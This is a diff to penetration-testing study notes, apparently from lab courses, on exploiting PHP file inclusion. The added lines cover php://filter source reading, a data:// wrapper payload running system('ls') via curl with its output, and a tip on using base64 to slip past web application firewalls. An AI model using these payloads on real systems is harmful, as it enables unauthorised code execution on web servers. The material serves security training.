@@ -362,6 +362,11 @@ d41y@htb[/htb]$ curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/
 <p class="read-more">
 ```
 
+> [!INFO]
+> Getting the Base64 encoded string helps when you don't want to have the PHP code inside a file executed but readable. Both, a regular LFI and using plain `php://filter`, won't help. You'll have to use some type of encoding.
+> 
+> `php://filter/convert.base64-encode/resource=...`
+
 Once you have the base64 encoded string, you can decode it and grep for ```allow_url_include``` to see its value:
 
 ```bash
@@ -374,7 +379,30 @@ You see that you have this option enabled, so you can use the ```data``` wrapper
 
 ##### Remote Code Execution
 
-With ```allow_url_include``` enabled, you can proceed with your ```data``` wrapper attack. As mentioned earlier, the ```data``` wrapper can be used to include external data, including PHP code. You can also pass it base64 encoded strings with ```text/plain;base64```, and it has the ability to decode them and execute the PHP code.
+With ```allow_url_include``` enabled, you can proceed with your ```data``` wrapper attack. As mentioned earlier, the ```data``` wrapper can be used to include external data, including PHP code. You can also pass it base64 encoded strings with ```text/plain;base64```, and it has the ability to decode them and execute the PHP code (_in the running web application's code_).
+
+> [!INFO]
+> `data://text/plain,...` for plain text (_PHP snippet has to be URL-encoded_).
+> 
+> `data://text/plain;base64,...` for Base64 encoded text.
+
+```bash
+kali@kali:~$ curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"
+...
+<a href="index.php?page=admin.php"><p style="text-align:center">Admin</p></a>
+admin.php
+bavarian.php
+css
+fonts
+img
+index.php
+js
+...
+```
+
+The embedded data was successfully executed.
+
+When web application firewalls or other security mechanisms are in place, they may filter strings like "system" or other PHP code elements. In such scenario, you can try to use the `data://` wrapper with base64-encoded data.
 
 So, your first step would be to base64 encode a basic PHP web shell:
 
